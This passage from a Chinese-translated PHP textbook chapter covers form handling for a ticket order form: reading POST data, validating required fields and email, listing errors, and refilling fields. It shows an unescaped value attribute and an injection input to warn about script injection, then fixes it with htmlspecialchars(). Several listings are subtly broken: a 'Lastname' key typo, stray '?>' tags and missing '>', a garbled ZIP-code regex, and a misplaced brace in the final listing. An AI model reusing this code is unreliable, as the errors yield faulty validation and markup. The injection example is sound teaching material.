<?php
if (isset($_SERVER["REQUEST_METHOD"]) &&
    $_SERVER["REQUEST_METHOD"] == "POST") {
    //Output data
}
?>
```

但如果表单是通过 GET 发送的，此方法也注定会失败。最稳妥的方法是另一个小技巧。你可能已经注意到，我们也给发送按钮指定了名称，这实际上并非必要：

`<input type="submit" name="Submit" value="Place order" />`

我们这样做是出于以下考虑：与其他表单元素一样，`$_GET["Field"]` 或 `$_POST["Field"]` 也为这些按钮提供 `value` 属性的值。通常这说不通，因为按钮的标签位于 `value` 中，用户无法更改。不过，这也是判断表单是否已提交的一个非常方便的方法。如果（在本示例中）`$_POST["Submit"]` 已设置，则表示表单刚刚提交；否则，未提交。

为结束本节，请查看脚本的完整版本。使用 if 查询来显示表单或用户在其中输入的数据。

```html
<html>
<head>
<title>Order Form</title>
</head>
<body>
<?php
if (isset($_POST["Submit"])) {
?>
<h1>Form Data</h1>
<?php
$Salutation = (isset($_POST["Salutation"]) && is_string($_POST["Salutation"])) ?
$_POST["Salutation"] : "";
$Firstname = (isset($_POST["FirstName"]) && is_string($_POST["FirstName"])) ?
$_POST["FirstName"] : "";
$Lastname = (isset($_POST["LastName"]) && is_string($_POST["LastName"])) ?
$_POST["LastName"] : "";
$Email = (isset($_POST["Email"]) && is_string($_POST["Email"])) ?
$_POST["Email"] : "";
$Promo = (isset($_POST["Promo"]) && is_string($_POST["Promo"])) ?
$_POST["Promo"] : "";
$Number = (isset($_POST["Number"]) && is_string($_POST["Number"])) ?
$_POST["Number"] : "";
$Section = (isset($_POST["Section"]) && is_array($_POST["Section"])) ?
$_POST["Section"] : [];
$Comments = (isset($_POST["Comments"]) && is_string($_POST["Comments"])) ?
$_POST["Comments"] : "";
$Terms = (isset($_POST["Terms"]) && is_string($_POST["Terms"]))
? $_POST["Terms"] : "";

$Salutation = htmlspecialchars($Salutation);
$Firstname = htmlspecialchars($Firstname);
$Lastname = htmlspecialchars($Lastname);
$Email = htmlspecialchars($Email);
$Promo = htmlspecialchars($Promo);
$Number = htmlspecialchars($Number);
$Section = htmlspecialchars(implode(", ", $Section));
$Comments = nl2br(htmlspecialchars($Comments));
$Terms = htmlspecialchars($Terms);
echo "<b>Salutation:</b> $Salutation<br />";
echo "<b>First name:</b> $Firstname<br />";
echo "<b>Last name:</b> $Lastname<br />";
echo "<b>Email:</b> $Email<br />";
echo "<b>Promo:</b> $Promo<br />";
echo "<b>Number of tickets:</b> $Number<br />";
echo "<b>Section:</b> $Section<br />";
echo "<b>Comments:</b> $Comments<br />";
echo "<b>Terms &amp; conditions:</b> $Terms<br />";
?>

<?php
} else {
?>
<h1>World Cup Ticket Service</h1>
<form>
<input type="radio" name="Salutation" value="Mr." />Mr.
<input type="radio" name="Salutation" value="Ms." />Ms. <br />
First name<input type="text" name="FirstName" /><br />
Last name<input type="text" name="LastName" /><br />
Email address<input type="text" name="Email" /><br />
Promo code <input type="password" name="Promo" /><br />
Number of tickets
<select name="Number">
<option value="0">Please select</option>
<option value="1">1</option>
<option value="2">2</option>
<option value="3">3</option>
<option value="4">4</option>
</select><br />
Desired section in the stadium
<select name="Section[]" size="4" multiple="multiple">
<option value="north">North</option>
<option value="south">South</option>
<option value="east">East</option>
<option value="west">West</option>
</select><br />
Comments/Notes
<textarea cols="70" rows="10" name="Comments"></textarea><br />
<input type="checkbox" name="Terms" value="ok" />
I accept the terms &amp; conditions.<br />
<input type="submit" name="Submit" value="Place order" />
</form>
<?php
}
?>
</body>
</html>
```

## 清单 13.8 输出所有表单数据（“form-output.php”)

## 用于发送的图形按钮

发送按钮还有第二种形式：<input type="image" />。在服务器端，你可以访问以下值：

- $_GET["Fieldname_x"] 或 $_POST["Fieldname_x"] 返回按钮鼠标单击的（相对）x 坐标（如果表单是通过键盘发送的，则为 0）。
- $_GET["Fieldname_y"] 或 $_POST["Fieldname_y"] 返回按钮鼠标单击的（相对）y 坐标（如果表单是通过键盘发送的，则为 0）。

## 13.3 表单验证

你现在知道如何访问表单数据；进一步处理（例如保存到数据库）在本书的其他章节中有所介绍。但是，与表单相关的大型网站还有另一个重要应用：表单数据验证。通常情况下，只有填写完整的表单才有意义，例如注册表单。此外，某些表单输入受特定条件限制，例如电子邮件地址，（非常简单地说）必须恰好包含一个 @ 符号。在 Web 代理机构中，这是开发人员的首要任务，因此我们在此阶段为表单添加了一些检查。

检查使用一个 $ok 变量。该变量最初为 true，但在发生错误时会更改为 false。在检查结束时，将根据 $ok 变量决定采取什么措施：要么出现错误消息并再次显示表单，要么——如前面的示例一样——输出表单中输入的所有内容。

### 13.3.1 文本字段

文本字段有一个特点：即使没有在其中输入任何内容，Web 浏览器也会传输字段中的数据，即使它是一个空字符串。在这方面，$_GET["field name"] 或 $_POST["field name"] 是空的但存在。因此，使用 isset() 进行检查是不够的。您必须将值与空字符串进行比较，或者更好的是，先调用 trim()。这样，即使只输入了空格，表单字段也会被视为空。

```php
<body>
<?php
$ok = false;
if (isset($_POST["Submit"])) {
  $ok = true;
  if (!isset($_POST["FirstName"]) ||
      !is_string($_POST["FirstName"]) ||
      trim($_POST["FirstName"]) == "" ) {
    $ok = false;
  }
  if ( !isset($_POST["LastName"]) ||
      !is_string($_POST["LastName"]) ||
      trim($_POST["LastName"]) == "" ) {
    $ok = false;
  }
  if ( !isset($_POST["Email"]) ||
      !is_string($_POST["Email"]) ||
      trim($_POST["Email"]) == "" ) {
    $ok = false;
  }
  if ( !isset($_POST["Promo"]) ||
      !is_string($_POST["Promo"]) ||
      trim($_POST["Promo"]) == "" ) {
    $ok = false;
  }
  if ( !isset($_POST["Comments"]) ||
      !is_string($_POST["Comments"]) ||
      trim($_POST["Comments"]) == "" ) {
    $ok = false;
  }
  if ($ok) {
?>
<h1>Form Data</h1>
<?php
// ...
?>
<?php
  }
}
if ( !$ok ) {
?>
<h1>World Cup Ticket Service</h1>
<form method="post">
...
</form>
<?php
}
?>
</body>
```

## 清单 13.9 所有文本字段均为必填字段（“form-validation-text-fields.php”节选)





让我们解释一下这里发生的情况：最初，假设必须显示表单，这就是为什么 $ok 被设置为 false。另一方面，如果表单刚刚被发送，那么 PHP 脚本最初假设一切正常 ($ok = true)。如果没有错误发生 (if ($ok))，则输出表单数据。但是，如果发生错误 (if (!$ok))，则输出表单本身。当然，如果页面在未发送表单的情况下直接调用，也会发生这种情况。这就是为什么脚本末尾有 if (!$ok) 独立查询的原因。

> **提示**
> 
> 如果发生错误，表单将直接显示——根本没有任何错误反馈。在 `if ($ok)` 之前的以下代码片段修复了这个问题：
> 
> if (!$ok) {
> echo "<p><b>Form incomplete</b></p>";
> }

### 13.3.2 单选按钮

如果一组单选按钮是必填字段，则必须选择其中一个按钮。可以通过简单检查 `$_GET["Field name"]` 或 `$_POST["Field name"]` 来验证，如下一个清单所示。

```
<body>
<?php
$ok = false;
if (isset($_POST["Submit"])) {
	$ok = true;
	if (!isset($_POST["Salutation"]) ||
		!is_string($_POST["Salutation"])) {
		$ok = false;
	}
	if (!isset($_POST["FirstName"]) ||
		!is_string($_POST["FirstName"]) ||
		trim($_POST["FirstName"]) == "") {
		$ok = false;
	}
	if (!isset($_POST["LastName"]) ||
		!is_string($_POST["LastName"]) ||
		trim($_POST["LastName"]) == "") {
		$ok = false;
	}
	if (!isset($_POST["Email"]) ||
		!is_string($_POST["Email"]) ||
		trim($_POST["Email"]) == "") {
		$ok = false;
	}
	if (!isset($_POST["Promo"]) ||
	    !is_string($_POST["Promo"]) ||
	    trim($_POST["Promo"]) == "") {
	  $ok = false;
	}
	if (!isset($_POST["Comments"]) ||
	    !is_string($_POST["Comments"]) ||
	    trim($_POST["Comments"]) == "") {
	  $ok = false;
	}
}
```

清单 13.10 单选按钮组是必填字段（摘自 "form-validation-radiobuttons.php"）

### 13.3.3 复选框

复选框的验证与单选按钮的验证以相同的方式进行：只需检查是否为表单元素向 PHP 脚本传递了值。以下代码（和往常一样，更改以粗体突出显示）为我们示例中的条款和条件复选框执行此操作。

```
<body>
<?php
$ok = false;
if (isset($_POST["Submit"])) {
  $ok = true;
  if (!isset($_POST["Salutation"]) ||
      !is_string($_POST["Salutation"])) {
    $ok = false;
  }
  if (!isset($_POST["FirstName"]) ||
      !is_string($_POST["FirstName"]) ||
      trim($_POST["FirstName"]) == "") {
    $ok = false;
  }
  if (!isset($_POST["LastName"]) ||
      !is_string($_POST["LastName"]) ||
      trim($_POST["LastName"]) == "") {
    $ok = false;
  }
  if (!isset($_POST["Email"]) ||
      !is_string($_POST["Email"]) ||
      trim($_POST["Email"]) == "") {
    $ok = false;
  }
  if (!isset($_POST["Promo"]) ||
      !is_string($_POST["Promo"]) ||
      trim($_POST["Promo"]) == "") {
    $ok = false;
  }
  if (!isset($_POST["Comments"]) ||
      !is_string($_POST["Comments"]) ||
      trim($_POST["Comments"]) == "") {
    $ok = false;
  }
  if (!isset($_POST["Terms"]) ||
      !is_string($_POST["Terms"])) {
    $ok = false;
  }
}
```

清单 13.11 复选框是必填字段（摘自 “form-validation-checkboxes.php”）

### 13.3.4 选择列表

乍一看，检查选择列表与之前的检查类似。但是，这里有一些特殊功能。对于一次显示多个元素的选择列表（<select size="..." > 或多选列表），可以提交表单而未选择任何内容。这与常规选择列表不同，常规列表中未选择任何内容时看起来不同。这在以下示例的列表中非常明显：

```
<select name="Number">
    <option value="0">Please select</option>
    <option value="1">1</option>
    <option value="2">2</option>
    <option value="3">3</option>
    <option value="4">4</option>
</select>
```

在此处，当表单发送时，列表元素始终被激活。因此，必须在 PHP 脚本中记下哪个元素对应 _未填写_ 状态。在示例中，这是带有值属性 0 的顶部值。以下清单显示了上下文中的相应查询。

```
<body>
<?php
$ok = false;
if (isset($_POST["Submit"])) {
    $ok = true;
    if (!isset($_POST["Salutation"]) ||
        !is_string($_POST["Salutation"])) {
        $ok = false;
    }
    if (!isset($_POST["FirstName"]) ||
        !is_string($_POST["FirstName"]) ||
        trim($_POST["FirstName"]) == "" ) {
        $ok = false;
    }
    if (!isset($_POST["LastName"]) ||
        !is_string($_POST["LastName"]) ||
        trim($_POST["LastName"]) == "" ) {
        $ok = false;
    }
    if (!isset($_POST["Email"]) ||
        !is_string($_POST["Email"]) ||
        trim($_POST["Email"]) == "" ) {
        $ok = false;
    }
    if (!isset($_POST["Promo"]) ||
        !is_string($_POST["Promo"]) ||
        trim($_POST["Promo"]) == "" ) {
        $ok = false;
    }
    if (!isset($_POST["Number"]) ||
        !is_string($_POST["Number"]) ||
        $_POST["Number"] == "0") {
        $ok = false;
    }
    if (!isset($_POST["Comments"]) ||
        !is_string($_POST["Comments"]) ||
        trim($_POST["Comments"]) == "" ) {
        $ok = false;
    }
    if (!isset($_POST["Terms"]) ||
        !is_string($_POST["Terms"])) {
        $ok = false;
    }
}
```

清单 13.12 选择列表是必填字段（摘自 “form-validation-select-lists.php”）

> 提示
> 
> 你将再次看到双重检查：首先使用 isset()，然后直接通过选择列表中的值进行检查。这样可以避免尴尬的错误消息，以防某个恶作剧者试图向脚本发送完全空的表单（不含选择列表）。

使用多选列表时，始终会一次显示多个元素。如果用户不想输入任何内容，则不会向 Web 服务器发送任何信息。因此，此处使用 isset() 进行检查就足够了。

```
<body>
<?php
$ok = false;
if (isset($_POST["Submit"])) {
    $ok = true;
    if (!isset($_POST["Salutation"]) ||
        !is_string($_POST["Salutation"])) {
        $ok = false;
    }
    if (!isset($_POST["FirstName"]) ||
        !is_string($_POST["FirstName"]) ||
        trim($_POST["FirstName"]) == "") {
        $ok = false;
    }
    if (!isset($_POST["LastName"]) ||
        !is_string($_POST["LastName"]) ||
        trim($_POST["LastName"]) == "") {
        $ok = false;
    }
    if (!isset($_POST["Email"]) ||
        !is_string($_POST["Email"]) ||
        trim($_POST["Email"]) == "") {
        $ok = false;
    }
    if (!isset($_POST["Promo"]) ||
        !is_string($_POST["Promo"]) ||
        trim($_POST["Promo"]) == "") {
        $ok = false;
    }
    if (!isset($_POST["Number"]) ||
        !is_string($_POST["Number"]) ||
        $_POST["Number"] == "0") {
        $ok = false;
    }
    if (!isset($_POST["Section"]) ||
        !is_array($_POST["Section"])) {
        $ok = false;
    }
    if (!isset($_POST["Comments"]) ||
        trim($_POST["Comments"]) == "") {
        $ok = false;
    }
    if (!isset($_POST["Terms"]) ||
        !is_string($_POST["Terms"])) {
        $ok = false;
    }
}
```

清单 13.13 多选列表是必填字段（摘自 "form-validation-multiselectlists.php"）

### 提示

如果多选列表包含多个条目（“请选择”选项、连字符等），那么你当然必须进行稍微复杂一些的检查。首先，你需要一个辅助函数，用于确定数组是否仅包含“垃圾值”。在我们的示例中，这些是空字符串和零；请根据你的要求进行调整：

```
function array_empty($a) {
    if (!is_array($a)) {
        return true;
    }
    foreach ($a as $value) {
        if ($value != "" && $value != "0") {
            return false;
        }
    }
    return true;
}
```

然后按如下方式调用多选列表检查：

```
if (!isset($_POST["Section"]) ||
    !is_array($_POST["Section"]) ||
    array_empty($_POST["Section"])) {
    $ok = false;
}
```





## 示例测试

之前的检查相当简单。字段是强制性的，这意味着它们必须包含某些内容。当然，这仅仅是实际可能情况的一小部分。在示例表单中，有一个 Email 字段，它当然应该包含电子邮件地址。此处的检查过程很清楚：它是通过正则表达式进行检查的。² 这取决于用户输入是否匹配搜索模式，变量 $ok 被设置为 false 或保持不变。请参考以下相应的代码片段：

```php
if (!isset($_POST["Email"]) ||
   trim($_POST["Email"]) == "" ||
   !preg_match(
      '/^[-a-zA-Z0-9\._-]+@[a-zA-Z0-9\.-]+\.[a-zA-Z]{2,6}$/',
      $_POST["Email"])) {
   $ok = false;
}
```

这个正则表达式看起来很复杂，但它只表达了以下意思：有一系列允许的字符，一个括号，接着是许多允许的字符（包括至少一个点），之后是两到六个字符，即域名扩展名。当然，对于电子邮件还有更详细且可能更好的验证表达式，但没人愿意费心去翻阅相关的 RFC (www.ietf.org/rfc/rfc2822.txt)。原则上，这只是捕获无意输入错误的问题，因此严格来说，检查 @ 符号几乎就足够了。³ 随着国际化域名的普及，无论如何都存在一个问题，因为正则表达式不识别域名中允许的特殊字符，例如变音符号；\w 表达式在这里可能会有所帮助。

### 这里还有两个有用的表达式：

- ^\((?w-)?\(\d{5}\))$ (用于美国邮政编码)
- ^\(\d|1?\d\d|2[0-4]\d|25[0-5])\.\(\d|1?\d\d|2[0-4]\d|25[0-5])\.\(\d|1?\d\d|2[0-4]\d|25[0-5])\.\(\d|1?\d\d|2[0-4]\d|25[0-5])$ (用于有效的 IP 地址 [IPv4])

2 在这种情况下，建议回到第 10 章，其中详细讨论了正则表达式。

3 此时有一个小轶事：在这些行的作者的一个私人项目中，他想实现对电子邮件地址特别严格的语法检查。但这没有帮助：两个人输入错误，将电子邮件地址以 .ed 而不是 .de 结尾。这里唯一有帮助的是使用两个文本字段来输入电子邮件地址，因为某人两次输入相同错误电子邮件地址的概率较低。另一方面，电子邮件地址只输入一次（错误）然后复制粘贴到第二个字段的概率相当高。

### 13.3.5 更详细的错误消息

之前的表单检查不太有建设性；出现的只是一条错误消息，表示出了问题。但是，错误消息没有揭示问题出在哪里。出于这个原因，你将在后面找到脚本的扩展版本。在这个版本中，所有发生错误的表单字段都存储在一个 $errorfields 数组中（见图 13.9）。这个数组在脚本末尾输出：

```php
echo "<ul><li>";
echo implode("</li><li>", $errorfields);
echo "</li></ul>";
```

通过这个小而有效的技巧，你可以轻松获得列表显示。完整示例在下一个清单中提供。

```php
<html>
<head>
<title>Order Form</title>
</head>
<body>
<?php
$ok = false;
$errorfields = [];
if (isset($_POST["Submit"])) {
    $ok = true;
    if (!isset($_POST["Salutation"]) ||
    !is_string($_POST["Salutation"])) {
    $ok = false;
    $errorfields[] = "Salutation";
    }
    if (!isset($_POST["FirstName"]) ||
    !is_string($_POST["FirstName"]) ||
    trim($_POST["FirstName"]) == "" ) {
    $ok = false;
    $errorfields[] = "First name";
    }
    if (!isset($_POST["LastName"]) ||
    !is_string($_POST["LastName"]) ||
    trim($_POST["LastName"]) == "" ) {
    $ok = false;
    $errorfields[] = "Last name";
    }
    if (!isset($_POST["Email"]) ||
    !is_string($_POST["Email"]) ||
    trim($_POST["Email"]) == "") {
    $ok = false;
    $errorfields[] = "Email";
    }

    if (!isset($_POST["Promo"]) ||
    !is_string($_POST["Promo"]) ||
    trim($_POST["Promo"]) == "") {
    $ok = false;
    $errorfields[] = "Promo";
    }

    if (!isset($_POST["Number"]) ||
    !is_string($_POST["Number"]) ||
    $_POST["Number"] == "0") {
    $ok = false;
    $errorfields[] = "Number of tickets";
    }

    if (!isset($_POST["Section"]) ||
    !is_array($_POST["Section"])) {
    $ok = false;
    $errorfields[] = "Section";
    }

    if (!isset($_POST["Comments"]) ||
    !is_string($_POST["Comments"]) ||
    trim($_POST["Comments"]) == "") {
    $ok = false;
    $errorfields[] = "Comments";
    }

    if (!isset($_POST["Terms"]) ||
    !is_string($_POST["Terms"])) {
    $ok = false;
    $errorfields[] = "Terms &amp; conditions";
    }

    if ($ok) {
?>
<h1>Form Data</h1>
<?php
$Salutation = (isset($_POST["Salutation"]) && is_string($_POST["Salutation"])) ?
$_POST["Salutation"] : "";
$Firstname = (isset($_POST["FirstName"]) && is_string($_POST["FirstName"])) ?
$_POST["FirstName"] : "";
$Lastname = (isset($_POST["LastName"]) && is_string($_POST["LastName"])) ?
$_POST["LastName"] : "";
$Email = (isset($_POST["Email"]) && is_string($_POST["Email"])) ?
$_POST["Email"] : "";
$Promo = (isset($_POST["Promo"]) && is_string($_POST["Promo"])) ?
$_POST["Promo"] : "";
$Number = (isset($_POST["Number"]) && is_string($_POST["Number"])) ?
$_POST["Number"] : "";
$Section = (isset($_POST["Section"]) && is_array($_POST["Section"])) ?
$_POST["Section"] : [];
$Comments = (isset($_POST["Comments"]) && is_string($_POST["Comments"])) ?
$_POST["Comments"] : "";
$Terms = (isset($_POST["Terms"]) && is_string($_POST["Terms"])) ?
$_POST["Terms"] : "";
$Salutation = htmlspecialchars($Salutation);
$Firstname = htmlspecialchars($Firstname);
$Lastname = htmlspecialchars($Lastname);
$Email = htmlspecialchars($Email);
$Promo = htmlspecialchars($Promo);
$Number = htmlspecialchars($Number);
$Section = htmlspecialchars(implode(" ", $Section));
$Comments = nl2br(htmlspecialchars($Comments));
$Terms = htmlspecialchars($Terms);
echo "<b>Salutation:</b> $Salutation<br />";
echo "<b>First name:</b> $Firstname<br />";
echo "<b>Last name:</b> $Lastname<br />";
echo "<b>Email:</b> $Email<br />";
echo "<b>Promo:</b> $Promo<br />";
echo "<b>Number of tickets:</b> $Number<br />";
echo "<b>Section:</b> $Section<br />";
echo "<b>Comments:</b> $Comments<br />";
echo "<b>Terms &amp; conditions:</b> $Terms<br />";
?>
<p>
<?php
} else {
echo "<p><b>Form incomplete</b></p>";
echo "<ul><li>";
echo implode("</li><li>", $errorfields);
echo "</li></ul>";
}
}
if (!$ok) {
?>
<h1>World Cup Ticket Service</h1>
<form method="post">
<input type="radio" name="Salutation" value="Mr. " />Mr. <input type="radio" name="Salutation" value="Ms. " />Ms. <br /> First name <input type="text" name="FirstName" /><br /> Last name<input type="text" name="LastName" /><br /> Email address <input type="text" name="Email" /><br /> Promo code <input type="password" name="Promo" /><br /> Number of tickets <select name="Number"> <option value="0">Please select</option> <option value="1">1</option> <option value="2">2</option> <option value="3">3</option> <option value="4">4</option> </select><br /> Desired section in the stadium <select name="Section[]" size="4" multiple="multiple"> <option value="north">North</option> <option value="south">South</option> <option value="east">East</option> <option value="west">West</option> </select><br /> Comments/Notes <textarea cols="70" rows="10" name="Comments"></textarea><br /> <input type="checkbox" name="Terms" value="ok" /> I accept the terms &amp; conditions.<br /> <input type="submit" name="Submit" value="Place order" /> </form>
<?php } ?>
</body>
</html>
```

**清单 13.14** 带有详细错误消息的表单验证 ("form-validation-detailed.php")

> **提示**
> 如果愿意，可以使表单更高效一些。实际上不需要 `$ok` 变量。检查 `$errorfields` 中是否有任何内容。如果没有，则没有发生错误。只需要拦截在首次调用 PHP 页面时表单根本不显示的情况。为此，可以使用一个新的辅助变量或 `$errorfields` 中的一个特殊虚拟条目。这可能会使脚本更短，但不一定更好。





![](img/ae7820c36e8f24c1623d26668b28e80e_432_0.png)

图 13.9 所有出现错误的详细列表

## 13.4 预填充

几页前，我们将之前的表单检查描述为“不具建设性”。情况依然如此——无论是否有详细错误消息。想象一下，如果表单稍长一些，用户填写它，这肯定需要五分钟。不幸的是，用户忘记了一个重要字段。于是他收到一条错误消息，想要填写缺失的字段。但令他恼火的是，表单又显示为 *空* 了。换句话说，用户必须重新填写所有字段。

在一些（较便宜的）网站上，开发人员采用非常简单的方法，要求用户仅按下网络浏览器中的 **后退** 按钮。不幸的是，这并不总是有效，因为并非所有浏览器都会缓存所有信息；这还取决于本地设置、内存使用情况和其他一般条件。

因此，**后退** 按钮方法不切实际；相反，它是不可行的。唯一真正可行的解决方案是使用已经输入的值预填充表单。

不幸的是，这种方法有一个缺点：有时可能非常费力且耗时。这很可能就是为什么许多书籍省略了此方法的原因。然而，事实是客户要求使用此技术，它应该是每个 PHP 开发者工具箱的一部分。在我们看来，因此不应省略此主题。而以下子部分的繁琐工作有两个好处：首先，所示技术始终相同，因此您可以轻松将其转移到自己的表单中。其次，您拥有一个真正帮助用户提供所需信息的表单——朝着专业网站又迈出了一步。

### 13.4.1 准备工作

为了尽可能轻松地实现预填充，之前的脚本需要做一些小更改。需要做什么很清楚：必须评估之前的表单条目，并可能将其填入表单。因此，脚本需要轻松访问用户输入或未输入的内容。正是这些信息已经被读取：

```php
$Salutation = (isset($_POST["Salutation"]) && is_string($_POST["Salutation"])) ?
$_POST["Salutation"] : "";
$Firstname = (isset($_POST["FirstName"]) && is_string($_POST["FirstName"])) ?
$_POST["FirstName"] : "";
$Lastname = (isset($_POST["LastName"]) && is_string($_POST["LastName"])) ?
$_POST["Lastname"] : "";
$Email = (isset($_POST["Email"]) && is_string($_POST["Email"])) ?
$_POST["Email"] : "";
$Promo = (isset($_POST["Promo"]) && is_string($_POST["Promo"])) ?
$_POST["Promo"] : "";
$Number = (isset($_POST["Number"]) && is_string($_POST["Number"])) ?
$_POST["Number"] : "";
$Section = (isset($_POST["Section"]) && is_array($_POST["Section"])) ?
$_POST["Section"] : [];
$Comments = (isset($_POST["Comments"]) && is_string($_POST["Comments"])) ?
$_POST["Comments"] : "";
$Terms = (isset($_POST["Terms"]) && is_string($_POST["Terms"])) ?
$_POST["Terms"] : "";
```

这非常实用。如果用户为称谓选择了其中一个单选按钮，则该信息位于 $Salutation 中。如果什么都没点击，该信息也位于 $Salutation 中，因为变量此时包含一个空字符串。只有在表单完整填写后，才会确定这些数据。但是，如果表单中存在错误，我们也需要这些数据。出于此原因，完整的块被移动到 PHP 代码的开头。然后它根据字段类型继续进行。

### 13.4.2 文本字段

对于单行文本字段——即 <input type="text" /> 和 <input type="password" />——预填充值位于 value 属性中。但是，使用类似以下的结构将是一个致命错误：

```html
<input type="text" name="Field " value=""><?=$Field?> />
```

如果用户之前在字段中输入了例如 ">><PHP<<"，会发生什么？这将导致以下 HTML 代码：

```html
<input type="text" name="Field " value=""><PHP<<"" />
```

因此，将输出一个空文本字段，后跟文本 PHP（多余的大于和小于字符会发生什么高度取决于浏览器）。稍加“犯罪心态”，就可以构造出可以通过这种方式输出的完全不同的东西——例如 JavaScript 代码。

> 注意
> 
> 第 32 章讨论了 PHP 编程中必要的安全注意事项。您将在此处找到如何避免由上述类型的粗心代码引起的事故的更多信息。

因此，您必须事先对变量中的值进行编辑。可以使用 htmlspecialchars() 函数。这也适用于多行文本字段，只是字段的值不在 value 属性中，而是位于 <textarea> 和 </textarea> 之间。以下清单显示了相关表单字段的新代码。

```
First name <input type="text" name="FirstName" value="<?php
echo htmlspecialchars($Firstname);
?>"/><br />
Last name <input type="text" name="LastName" value="<?php
echo htmlspecialchars($Lastname);
?>"/><br />
Email address <input type="text" name="Email" value="<?php
echo htmlspecialchars($Email);
?>"/><br />
Promo code <input type="password" name="Promo" value="<?php
echo htmlspecialchars($Promo);
?>"/><br />
...
Comments/Notes
<textarea cols="70" rows="10" name="Comments"><?php
echo htmlspecialchars($Comments);
?></textarea><br />
```

代码清单 13.15 文本字段预填充（“form-prefill-textfields.php”节选）

> 注意
> 
> 确保您不会创建任何额外的空白（例如空格），因为这些空格可能会被包含在表单字段的“value”中。

### 13.4.3 单选按钮

对于单选按钮，事情非常简单：如果单选按钮的值（value 属性）与 $_GET 或 $_POST 中的值匹配，则单选按钮被预选（checked 属性）；否则，则不是。这有点枯燥，但之后实现起来非常容易。

```html
<input type="radio" name="Salutation" value="Mr. " <?php
if ($Salutation == "Mr.") {
    echo "checked=\"checked\""; }
?>/Mr.
<input type="radio" name="Salutation" value="Ms. " <?php
if ($Salutation == "Ms.") {
    echo "checked=\"checked\""; }
?>/Ms. <br />
```

代码清单 13.16 单选按钮预填充（“form-prefill-radiobuttons.php”节选）

### 13.4.4 复选框

复选框遵循与单选按钮相同的模式：如果值与 $_GET 或 $_POST 中的数据匹配（或者如果根本有值），则必须输出 checked="checked"。

```html
<input type="checkbox" name="Terms" value="ok" <?php
if ($Terms != "") {
    echo "checked=\"checked\" "; }
?/>
I accept the terms &amp; conditions.<br />
```

代码清单 13.17 复选框预填充（“form-prefill-checkboxes.php”节选）

### 13.4.5 选择列表

对于简单选择列表，程序员的生活仍然很简单。同样，value 属性的值与来自 $_GET 或 $_POST 的数据进行比较。与复选框或单选按钮的主要区别在于，在这种情况下必须设置的属性称为 selected，而不是 checked。

票券数量

```html
<select name="Number">
<option value="0">Please select</option>
<option value="1"<?php
if ($Number == "1") {
    echo " selected=\"selected\""; }
?>1</option>
<option value="2"<?php
if ($Number == "2") {
    echo " selected=\"selected\""; }
?>
?>2</option>
<option value="3"<?php
if ($Number == "3") {
    echo " selected=\"selected\"";
}
?>3</option>
<option value="4"<?php
if ($Number == "4") {
    echo " selected=\"selected\"";
}
?>
?>4</option>
</select><br />
```

代码清单 13.18 选择列表预填充（“form-prefill-selectlists.php”节选）

对于多选列表（<select multiple>），这稍微困难一些，因为不止一个值，而是有多个可能的值。幸运的是，PHP 包含 in_array() 函数，4 它检查元素是否在数组中。多选列表的预填充的工作方式完全相同：对于每个元素，必须检查该值是否在从 $_GET 或 $_POST 读取的数组中。

> **注意**
> 
> 现在您也明白为什么我们声明 $Section 为空数组，如果用户没有选择任何内容的话。in_array() 函数仅适用于数组，但也适用于空数组。因此，我们通过具有前瞻性地编程避免了在这一点上出现错误消息。

```html
Desired section in the stadium
<select name="Section[]" size="4" multiple="multiple">
<option value="north"<?php
if (in_array("north", $Section)) {
    echo " selected=\"selected\"";
}
?>
>North</option>
<option value="south"<?php
if (in_array("south", $Section)) {
    echo " selected=\"selected\"";
}
?>
>South</option>
<option value="east"<?php
if (in_array("east", $Section)) {
```

4 您可以在第 8 章中了解（几乎）关于数组的所有内容。





echo " selected=\"selected\"";
}
?>East</option>
<option value="west"<?php
if (in_array("west", $Section)) {
echo " selected=\"selected\"";
}
?>West</option>
</select><br />

## 清单 13.19 多选列表已预填（"form-prefill-multiselect-lists.php" 的节选）

这就完成了。完整的表单现在提供

- 强制字段检查，
- 详细错误消息，以及
- 如果发生错误，则预填。

因此，我们创建了一个“完美”的表单。出于这个原因，清单 13.20 再次显示完整代码，包括带有（并非十分理想）正则表达式的电子邮件检查。

```php
<html>
<head>
<title>Order Form</title>
</head>
<body>
<?php
$Salutation = (isset($_POST["Salutation"]) && is_string($_POST[
"Salutation"])) ?
$_POST["Salutation"] : "";
$Firstname = (isset($_POST["FirstName"]) && is_string($_POST["FirstName"]))
?
$_POST["FirstName"] : "";
$Lastname = (isset($_POST["LastName"]) && is_string($_POST["LastName"])) ?
$_POST["Lastname"] : "";
$Email = (isset($_POST["Email"]) && is_string($_POST["Email"])) ?
$_POST["Email"] : "";
$Promo = (isset($_POST["Promo"]) && is_string($_POST["Promo"])) ?
$_POST["Promo"] : "";
$Number = (isset($_POST["Number"]) && is_string($_POST["Number"])) ?
$_POST["Number"] : "";
$Section = (isset($_POST["Section"]) && is_array($_POST["Section"])) ?
$_POST["Section"] : [];
$Comments = (isset($_POST["Comments"]) && is_string($_POST["Comments"])) ?
$_POST["Comments"] : "";
$Terms = (isset($_POST["Terms"]) && is_string($_POST["Terms"])) ?
$_POST["Terms"] : "";

$ok = false;
$errorfields = [];
if (isset($_POST["Submit"])) {
	$ok = true;
	if (!isset($_POST["Salutation"]) ||
		!is_string($_POST["Salutation"])) {
		$ok = false;
		$errorfields[] = "Salutation";
	}
	if (!isset($_POST["FirstName"]) ||
		!is_string($_POST["FirstName"]) ||
		trim($_POST["FirstName"]) == "") {
		$ok = false;
		$errorfields[] = "First name";
	}
	if (!isset($_POST["LastName"]) ||
		!is_string($_POST["LastName"]) ||
		trim($_POST["LastName"]) == "") {
		$ok = false;
		$errorfields[] = "Last name";
	}
	if (!isset($_POST["Email"]) ||
		trim($_POST["Email"]) == "" ||
		!preg_match(
			'/^[a-zA-Z0-9-\\_\.]+@[a-zA-Z0-9-\\_\.]+\\.[a-zA-Z]{2,6}$/',
			$_POST["Email"])) {
		$ok = false;
		$errorfields[] = "Email";
	}
	if (!isset($_POST["Promo"]) ||
		!is_string($_POST["Promo"]) ||
		trim($_POST["Promo"]) == "") {
		$ok = false;
		$errorfields[] = "Promo";
	}
	if (!isset($_POST["Number"]) ||
		!is_string($_POST["Number"]) ||
		$_POST["Number"] == "0") {
		$ok = false;
		$errorfields[] = "Number of tickets";
	}
}
if (!isset($_POST["Section"]) ||
!is_array($_POST["Section"])) {
$ok = false;
$errorfields[] = "Section";
}
if (!isset($_POST["Comments"]) ||
!is_string($_POST["Comments"]) ||
trim($_POST["Comments"]) == "") {
$ok = false;
$errorfields[] = "Comments";
}
if (!isset($_POST["Terms"]) ||
